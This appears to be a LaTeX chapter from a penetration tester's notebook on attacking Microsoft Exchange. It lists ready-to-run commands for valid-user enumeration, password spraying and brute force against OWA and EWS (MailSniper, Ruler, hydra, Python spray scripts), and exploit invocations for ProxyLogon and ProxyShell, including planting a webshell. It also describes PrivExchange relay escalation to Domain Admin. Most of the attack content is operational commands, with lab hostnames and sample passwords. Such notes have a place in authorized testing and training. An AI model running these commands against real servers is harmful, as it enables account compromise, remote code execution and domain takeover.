
\section{Attacks}
\subsection{intro}

\begin{figure}[!ht]
  \includegraphics[width=\linewidth]{network/exchange/images/exchange-mindmap.png}
  \caption{Exchange attack mindmap}
  \label{fig:exchange-attack-mindmap}
\end{figure}

\href{https://raw.githubusercontent.com/Orange-Cyberdefense/arsenal/master/mindmap/Pentesting_MS_Exchange_Server_on_the_Perimeter.png}{attack mindmap}


\subsection{Valid user enumeration}

user login to OWA can be \verb+<DOMAIN>\<user>+ or \verb+<user>@<DOMAIN>+

to generate a wordlist

\subsubsection{Powershell MailSniper (OWA/EWS)}
\begin{verbatim}
Invoke-UsernameHarvestOWA –UserList .\username_list.txt 
    –ExchHostname mail.domain.com –Domain the_identified_internal_domain_name 
    –OutFile potential_usernames.txt -Threads 25
\end{verbatim}

\subsubsection{Metasploit (OWA)}
msf (\verb+auxiliary/scanner/http/owa_login+)

\subsubsection{msmailprobe (OWA)}
\begin{verbatim}
msmailprobe userenum --onprem -t rastalabs.local -U ./users.txt -o valids.txt
\end{verbatim}

\subsection{Bruteforce/spraying attack}



\subsubsection{Ruler}
\href{https://github.com/sensepost/ruler}{Ruler} interact with Exchange servers remotely through either the MAPI/HTTP or RPC/HTTP protocol. 

\begin{verbatim}
    ./ruler --basic --insecure --nocache --url  https://<fqdn>/autodiscover/autodiscover.xml -d <domain_fqdn>   brute --users ./users.txt --passwords <password_wl> --verbose  --delay 0  --stop --threads 10
\end{verbatim}

in case of an error like following might mean the password is valid but expired
\begin{verbatim}
ERROR: 21:55:37 brute.go:192: An error occured in connection - Get "https://10.129.186.4/autodiscover/autodiscover.xml": Get "https://10.129.186.4/autodiscover/autodiscover.xml": net/http: request canceled
\end{verbatim}


\subsubsection{MailSniper}

mailsniper \verb+Invoke-PasswordSprayOWA+ or \verb+Invoke-PasswordSprayEWS+

\begin{verbatim}
Invoke-PasswordSprayOWA -ExchHostname exch01.inlanefreight.local -UserList .\users.txt -Password "Spring2024!"
\end{verbatim}


in case of an error like following might mean the password is valid but expired
\begin{verbatim}
var mainLogonDiv = window.document.getElementById("mainDiv"); mainLogonDiv.className = mainLogonDivClassName;
:-(
Something went wrong
We can't get that information right now. Please try again later.
X-FEServer EXCH01
Date:9/30/2024 7:39:40 PM
More details...
 Refresh the page
    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebExc
   eption
    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
    + PSComputerName        : localhost
\end{verbatim}


\subsubsection{OWA}

Linux:
\begin{itemize}
    \item 
        msf (\verb+auxiliary/scanner/http/owa_login+)
    \item
        msf (\verb+auxiliary/scanner/http/owa_ews_login+)
    \item
        \verb+owabf2.py+
    \item
        \verb+owabrute.sh+
    \item hydra
        \begin{verbatim}
        hydra   -I -t 40           \
                -L "${USERSLIST}"  \
                -e s -u   -f        \
                -P "${PASSLIST}" \
                "${DOMAIN}"       \
                https-post-form "/owa/auth.owa:flags=4&destination=https\://${DOMAIN}/owa/&forcedownlevel=0&username=^USER^&password=^PASS^&isUtf8=1:F=The user name or password"
        \end{verbatim}
    \item  
        \href{https://raw.githubusercontent.com/3gstudent/Homework-of-Python/master/checkOWA.py}{checkOWA.py} 
\end{itemize}


\subsubsection{EWS}
linux:
\begin{itemize}
    \item 
        \href{https://raw.githubusercontent.com/3gstudent/Homework-of-Python/master/checkEWS.py}{checkEWS.py}:
    \begin{verbatim}
        python checkEWS.py 10.10.110.254 443 plaintext rlab ahope Summer2023
        checkEWS.py test.com 80 ntlmhash test.com user1 c5a237b7e9d8e708d8436b6148a25fa1
    \end{verbatim}
    \item
        \href{https://github.com/iomoath/PyExchangePasswordSpray}{exchange\_password\_spray.py}:
        \begin{verbatim}
        python3 exchange_password_spray.py -U userlist.txt -P password.txt \
            --url https://webmail.example.org/EWS/Exchange.asmx \
            --delay 62 -T 1 \
            -ua "Microsoft Office/16.0 (Windows NT 10.0; MAPI 16.0.9001; Pro)" \
            -O result.txt -v
        \end{verbatim}
        
\end{itemize}

\subsection{CVE}
\subsubsection{RCE (Proxylogon)}
ProxyLogon is the formally generic name for CVE-2021-26855, a vulnerability on Microsoft Exchange Server that allows an attacker bypassing the authentication and impersonating as the admin.

We have also chained this bug with another post-auth arbitrary-file-write vulnerability, CVE-2021-27065, to get code execution.

metasploit (\verb+scanner/http/exchange_proxylogon+)
\begin{verbatim}
set RHOSTS <ip>
\end{verbatim}

\href{https://github.com/hakivvi/proxylogon}{proxylogon.py}:
\begin{verbatim}
python3 proxylogon.py http://mail.corp.com email@corp.com
\end{verbatim}

\subsubsection{RCE (ProxyShell)}
CVE-2021-34473 is a pre-auth remote-code execution in Microsoft Exchange Server. This faulty URL normalization lets us access an arbitrary backend URL while running as the Exchange Server machine account. Although this bug is not as powerful as the SSRF in ProxyLogon, and we could manipulate only the path part of the URL

The researcher discovered the vulnerability when supplying a mailbox in the Email parameter of the URI. The lack of input validation in the code caused this. 

Exchange has a dedicated PowerShell module to make configurational changes in the environment. Any user that has the rights to make such changes can utilize commands related to mailboxes using the PowerShell module.

While being limited, the \verb+New-MailboxExportRequest+ command can be used to write (export) an arbitrary webshell on disk using the \verb+-FilePath+ parameter. One caveat, that is the export and import of files in the \href{https://learn.microsoft.com/en-us/openspecs/office_file_formats/ms-pst/141923d5-15ab-4ef1-a524-6dce75aae546}{PST format}. \href{https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/}{The following blog post} goes into detail how to take advantage of Exchange PowerShell module, the deserialization path, the communication with the PowerShell remote endpoint, and the interaction between PowerShell and \href{https://learn.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol}{WS Management protocol}.

\begin{itemize}
    \item \href{https://github.com/kh4sh3i/ProxyShell}{ProxyShell}
    \item \href{https://github.com/mr-r3bot/Proxyshell-Exchange}{Proxyshell-Exchange}
    \item Metasploit \verb+windows/http/exchange_proxyshell_rce+
\end{itemize}

recon:
\begin{verbatim}
nuclei -u target.com -t proxyshell.yaml
\end{verbatim}

shell:
\begin{verbatim}
sudo python3 ProxyShell.py -u https://<IP>
python3 proxyshell.py -u https://<IP>/ -e <email>
\end{verbatim}

\subsubsection{ProxyRelay}
\href{https://devco.re/blog/2022/10/19/a-new-attack-surface-on-MS-exchange-part-4-ProxyRelay/}{ProxyRelay}

\subsubsection{PrivExchange}

\href{https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/}{PrivExchange}

In most organisations using Active Directory and Exchange, Exchange servers have such high privileges that being an Administrator on an Exchange server is enough to escalate to Domain Admin. 

There is a way to let Exchange authenticate to attackers using NTLM over HTTP. This can be combined with an NTLM relay attack to escalate from any user with a mailbox to Domain Admin in most organisations 

This attacks combines a few known vulnerabilities and known protocol weaknesses into a new attack. There are 3 components which are combined to escalate from any user with a mailbox to Domain Admin access:
\begin{itemize}
    \item Exchange Servers have (too) high privileges by default
    \item NTLM authentication is vulnerable to relay attacks
    \item Exchange has a feature which makes it authenticate to an attacker with the computer account of the Exchange server
\end{itemize}
    